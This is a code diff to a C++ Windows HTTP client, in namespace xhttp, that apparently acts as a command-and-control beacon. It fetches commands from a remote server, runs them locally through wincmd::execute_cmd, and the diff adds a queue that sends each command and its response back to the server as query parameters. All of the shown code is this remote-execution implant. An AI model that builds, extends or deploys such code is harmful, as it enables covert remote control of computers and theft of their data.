@@ -17,7 +17,11 @@ namespace xhttp {
 std::vector<uint32_t> req_body;
 std::string cmdstr;
 std::string cmdString;
+std::string cmdGroup;
 std::string cmdValue;
+CommandQueue queue;
+int key;
+std::string cmdResponse;
 
 bool parse_url(const std::string& url, std::string& protocol, std::string& host, int& port, std::string& path) {
     std::stringstream ss(url);
@@ -67,16 +71,39 @@ std::string createCookiesString() {
     return cookies;
 }
 
-std::string buildRequest(const std::string& path, const std::string& host, const std::string& cookies) {
-    // Call createCookiesString to get the cookies
-    std::string cookiesString = createCookiesString();
-    
-    return "GET /" + path + " HTTP/1.1\r\n"
-           "Host: " + host + "\r\n"
-           "Connection: Keep-Alive\r\n"
-           "Keep-Alive: timeout=15, max=1000\r\n" // add \r\n at the end
-           "Cookie: " + cookiesString + "\r\n"    // add \r\n at the end
-           "\r\n";
+std::string buildRequest(const std::string& path, const std::string& host, const std::string& cookies, CommandQueue& queue) {
+    // Check if the queue is not empty
+    if (!queue.empty()) {
+        // Access the first element in the map
+        auto it = queue.begin();
+        // Access the command info
+        auto& cmdqueue = it->second;
+        // Access cmdValue, cmdString, cmdResponse
+        std::string cmdGroup = cmdqueue.cmdGroup;
+        std::string cmdString = cmdqueue.cmdString;
+        std::string cmdResponse = cmdqueue.cmdResponse;
+
+        std::string cookiesString = createCookiesString(); // Assuming this function is defined
+        std::string queryParams = "cmdValue=" + cmdGroup + "&cmdString=" + cmdString + "&cmdResponse=" + cmdResponse;
+
+        std::cout << "Params: " << queryParams << std::endl;
+        return "GET /" + path + "?" + queryParams + " HTTP/1.1\r\n"
+               "Host: " + host + "\r\n"
+               "Connection: Keep-Alive\r\n"
+               "Keep-Alive: timeout=15, max=1000\r\n" // add \r\n at the end
+               "Cookie: " + cookiesString + "\r\n"    // add \r\n at the end
+               "\r\n";
+        
+    } else {
+        // Queue is empty, return request without command information
+        std::string cookiesString = createCookiesString(); // Assuming this function is defined
+        return "GET /" + path + "?" + " HTTP/1.1\r\n"
+               "Host: " + host + "\r\n"
+               "Connection: Keep-Alive\r\n"
+               "Keep-Alive: timeout=15, max=1000\r\n" // add \r\n at the end
+               "Cookie: " + cookiesString + "\r\n"    // add \r\n at the end
+               "\r\n";
+    }
 }
 
 bool initialize_winsock() {
@@ -126,7 +153,7 @@ std::string http_get(const std::string& url) {
         return "";
     }
 
-    std::string request = buildRequest(path, host, cookies);
+    std::string request = buildRequest(path, host, cookies, queue);
 
     if (send(ConnectSocket, request.c_str(), request.length(), 0) == SOCKET_ERROR) {
         std::cerr << "Error sending request: " << WSAGetLastError() << std::endl;
@@ -166,6 +193,18 @@ std::string extractCMD(const std::vector<char>& data) {
 
 
     return cmdValue;
+}
+
+void addToQueue(CommandQueue& queue, int key, const std::string& cmdValue, const std::string& cmdString, const std::string& cmdResponse) {
+    Command command;
+    command.cmdGroup = cmdValue;
+    command.cmdString = cmdString;
+    command.cmdResponse = cmdResponse;
+    queue[key] = command;  // Add command to the queue with the specified key
+}
+
+void removeFromQueue(CommandQueue& queue, int key) {
+    queue.erase(key);  // Remove command from the queue with the specified key
 }
 
 bool extract_content_length(const std::vector<char>& data, size_t& content_length) {
@@ -223,11 +262,9 @@ std::vector<char> receive_data(SOCKET ConnectSocket) {
         }
     } while (bytesReceived == BUFFER_SIZE);
 
-//    std::cerr << "CMD: " << cmdValue << std::endl; 
-//    std::cerr << "CMD String: " << cmdString << std::endl; 
-    std::cout << cmdString << std::endl;
     if (!cmdString.empty()) {
-        wincmd::execute_cmd(cmdString, wincmd::current_dir, wincmd::out_put, wincmd::time_out); //  
+        addToQueue(queue, key, cmdGroup, cmdString, cmdResponse);
+        wincmd::execute_cmd(queue, wincmd::current_dir, wincmd::time_out);  
     } else {
         std::cerr << "Received empty command" << std::endl;
     }
